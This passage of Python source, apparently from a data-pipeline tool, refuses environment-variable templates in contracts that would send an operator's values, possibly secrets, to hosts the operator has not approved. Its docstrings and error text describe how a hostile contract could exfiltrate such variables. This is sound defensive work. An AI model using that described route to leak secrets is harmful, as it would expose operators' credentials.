        if target.host is None or target.quiet or target.keyword_text is not None:
            return _Endpoint(f"a destination this check cannot read ({field})", None)
        written = _value_at(block, target.path) if target.path else None
        if _host_written_literally(written):
            return _Endpoint(f"host {target.host!r} ({field})", target.host)
        via = _host_variable(written) if isinstance(written, str) else None
        if via is not None and not _project_supplied(via, env):
            via = None
        return _Endpoint(f"the host that {field} renders to", "", via)
    return _Endpoint(f"an endpoint of {block_where}", None)


def _pairing_refusal(
    name: str, written_at: str, endpoint: _Endpoint, *, stage: Optional[str]
) -> EnvTemplateError:
    """The refusal for variable ``name``, written at ``written_at``, sent to ``endpoint``."""
    where, host, via = endpoint
    placeholder = "{{ env.* }}"
    if host:
        entry = f"{name}@{host}"
        fix = (
            f"Add {entry} to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator environment, "
            f"or write the host as one {placeholder} placeholder."
        )
    elif host == "":
        entry = f"{name}@<the host it renders to>"
        fix = (
            f"Add {entry} to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator environment "
            "(the host it renders to where fluid apply runs, without a port), or "
            + (
                f"export {via} in the operator environment (the shell, CI or FLUID_SECRETS_FILE), "
                "which makes the address yours."
                if via
                else f"write the host as one {placeholder} placeholder."
            )
        )
    else:
        entry = name
        fix = (
            "This check cannot read a host there, so only an entry for any host clears it: add "
            f"{name} to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator environment, or "
            f"write the host as a plain host field or one {placeholder} placeholder."
        )
    return EnvTemplateError(
        what=(
            f"{{{{ env.{name} }}}} is sent to {where}"
            + (f" ({via}, which a project dotenv file supplied)" if via else "")
            + f", and the operator has not paired {name} with that host"
        ),
        where=written_at,
        why=(
            "A variable's value goes to every endpoint of the block that holds it, so a contract "
            "could name any variable of the operator's environment beside a host of its own and "
            "have the value sent there. The name cannot tell a secret from any other variable "
            "(DB_PW, PGPASS and DATABASE_URL look like none)."
            + (
                " A host that a project dotenv file picks is the project's choice, not the "
                "operator's, and the project ships the contract too."
                if via
                else ""
            )
            + (f" ({stage})" if stage else "")
        ),
        fix=fix,
        doc=doc_url(),
        extras={
            "variable": name,
            "field": written_at,
            "reason": "unpaired",
            "endpoint": where,
            "entry": entry,
            **({"origin": "project-dotenv", "host_variable": via} if via else {}),
        },
        code="EnvTemplateHostError",
    )


#: A block of a contract, with the path that names it.
_Block = Tuple[str, Mapping[str, Any]]
#: The blocks that hold the variables a destination receives, and the blocks whose endpoints
#: receive them.
_Group = Tuple[List[Tuple[str, Any]], List[_Block]]


def _builds_of(contract: Mapping[str, Any]) -> List[_Block]:
    """The builds of ``contract`` with the path that names each, or the one ``{"build": ...}``."""
    out: List[_Block] = []
    builds = contract.get("builds")
    if isinstance(builds, list):
        out.extend(
            (f"builds[{index}]", build)
            for index, build in enumerate(builds)
            if isinstance(build, Mapping)
        )
    if isinstance(contract.get("build"), Mapping):
        out.append(("build", contract["build"]))
    return out


def _blocks_of(contract: Mapping[str, Any], base: str, build: Mapping[str, Any]) -> List[_Group]:
    """The groups of a build (:data:`_Group`).

    The source: ``properties.source``, judged as a whole and as its ``connection`` (the block a
    runner hands the policy). The sink: ``properties.sink`` and the ``binding.location`` of every
    expose, which carry the catalog's address and the settings sent to it, ``catalogAuth``
    included.
    """
    props = build.get("properties")
    if not isinstance(props, Mapping):
        return []
    groups: List[_Group] = []
    source = props.get("source")
    if isinstance(source, Mapping):
        where = f"{base}.properties.source"
        judged: List[_Block] = [(where, source)]
        if isinstance(source.get("connection"), Mapping):
            judged.append((f"{where}.connection", source["connection"]))
        groups.append(([(where, source)], judged))
    sink_blocks: List[_Block] = []
    if isinstance(props.get("sink"), Mapping):
        sink_blocks.append((f"{base}.properties.sink", props["sink"]))
    # Every expose, not only the ones ``outputs`` names: a runner picks its own (``exposes[0]`` for
    # dlt, airbyte and meltano, the first Iceberg expose for the Kafka Connect and Debezium sinks, and
    # ``exposes[0]`` again when ``outputs`` names none that exists), so ``outputs`` is no promise of
    # what is written where.
    exposes = contract.get("exposes")
    for index, expose in enumerate(exposes if isinstance(exposes, list) else []):
        binding = expose.get("binding") if isinstance(expose, Mapping) else None
        location = binding.get("location") if isinstance(binding, Mapping) else None
        if isinstance(location, Mapping):
            sink_blocks.append((f"exposes[{index}].binding.location", location))
    if sink_blocks:
        groups.append((list(sink_blocks), list(sink_blocks)))
    return groups


def check_env_pairing(
    contract: Any,
    *,
    environ: Optional[Mapping[str, str]] = None,
    stage: Optional[str] = None,
) -> None:
    """Refuse an ``{{ env.NAME }}`` that would be sent to an endpoint the contract picked.

    Run on the contract as written, on the acquisition path, before
    :func:`render_contract` expands anything. For each build, every variable, whatever it is
    called, in the source block and in the sink blocks (:func:`_blocks_of`) renders only when each
    endpoint of its blocks is one of:

    * this machine (loopback, a local socket), or
    * a host written as one whole ``{{ env.* }}`` (the operator chose the address), or
    * a host the operator paired with the variable (``NAME@host`` in
      ``FLUID_ACQUISITION_SECRET_REF_ALLOWLIST``).

    The judgement is :func:`fluid_build.secrets.policy.refuse_unless_allowed`'s, the one a
    ``secretRef`` in the block meets, so its reading of a destination (keyword strings, query
    strings that name a host, tunnels, failover hosts, Snowflake's account) is not repeated
    here, and a blank or unreadable endpoint refuses. A block whose one destination is an object
    store, or that names no endpoint and no field named for an address, passes: that is the gap the
    policy documents, and a local file source. A field named for an address that the policy reads
    nothing from (``bootstrap_servers``, ``db_host``, ``Host``) is an endpoint this check cannot
    read, which only an entry for any host clears (:func:`_unread_addresses`). A variable that is
    unset or empty is left to :func:`render_contract`, which says so.

    Raises :class:`EnvTemplateError` (``EnvTemplateHostError``, reason ``unpaired``) naming the
    variable, the field that writes it and the endpoint as written, never a rendered value.
    """
    if not isinstance(contract, Mapping):
        return
    from fluid_build.secrets.policy import variable_allowed

    env = os.environ if environ is None else environ
    for base, build in _builds_of(contract):
        for named, judged in _blocks_of(contract, base, build):
            names: Dict[str, str] = {}
            for where, node in named:
                _names_in(node, where, names)
            # Unset or empty, as the render of a build reads it (it keeps a value of blanks): the
            # render refuses those by name. A value of blanks is a value, and is judged like one.
            names = {
                name: at for name, at in names.items() if _has_value(env.get(name), strip=False)
            }
            if not names:
                continue
            for block_where, block in judged:
                view, unread = _endpoint_view(block, env)
                for name, written_at in names.items():
                    if view is not None and _unpaired(name, view, env):
                        endpoint = _describe_endpoint(name, view, block, block_where, env)
                        raise _pairing_refusal(name, written_at, endpoint, stage=stage)
                    if unread and not variable_allowed(
                        name, None, environ=env, loopback_exempt=False
                    ):
                        where = _dotted(block_where, (unread[0],))
                        endpoint = _Endpoint(
                            f"a destination this check cannot read ({where})", None
                        )
                        raise _pairing_refusal(name, written_at, endpoint, stage=stage)


def missing_fields(value: Any, environ: Optional[Mapping[str, str]] = None) -> Dict[str, List[str]]:
    """The variables ``value`` names that are unset or empty here, each with the fields that
    write it (``exposes[0].binding.location.bucket``), sorted by name.

    Credential-shaped names are left out: they are never rendered, so they are
    not waiting for a value. What ``fluid validate`` warns about; the same
    variables :func:`render_contract` refuses.
    """
    from fluid_build.observability.secret_redactor import is_sensitive_key_name

    env = os.environ if environ is None else environ
    found: Dict[str, List[str]] = {}

    def walk(node: Any, where: str) -> None:
        if isinstance(node, str):
            if "{{" in node:
                for raw in ENV_TEMPLATE_RE.findall(node):
                    name = raw.strip()
                    if not is_sensitive_key_name(name) and not _has_value(env.get(name)):
                        found.setdefault(name, []).append(where)
        elif isinstance(node, list):
            for index, item in enumerate(node):
                walk(item, f"{where}[{index}]")
        elif isinstance(node, dict):
            for key, item in node.items():
                walk(item, f"{where}.{key}" if where else str(key))

    walk(value, "")
    return {name: found[name] for name in sorted(found)}


__all__ = [
    "ENV_TEMPLATE_RE",
    "HOST_FIELD_NAMES",
    "HOST_FIELD_WORDS",
    "EnvTemplateError",
    "SENSITIVE_REFUSE",
    "SENSITIVE_RENDER",
    "UNSET_DEFER",
    "UNSET_ERROR",
    "check_env_pairing",
    "check_host_templates",
    "missing_fields",
    "placeholder_names",
    "render_contract",
    "render_text",
]
